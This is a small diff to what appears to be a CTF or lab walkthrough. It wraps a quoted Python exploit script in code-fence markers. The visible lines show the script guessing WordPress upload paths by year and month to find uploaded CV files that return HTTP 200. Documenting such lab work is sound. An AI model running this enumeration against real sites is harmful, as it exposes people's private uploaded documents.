@@ -91,6 +91,7 @@ I used an exploit script originally shared on [vagmour.eu](https://vagmour.eu) (
 
 exploit.py
 
+```bash
 import requests
 
 print("""
@@ -112,6 +113,7 @@ URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "
 req = requests.get(URL)
 if req.status_code == 200:
 print("[+] URL of CV found! " + URL)
+```
 
 We give the script execution permissions:
 
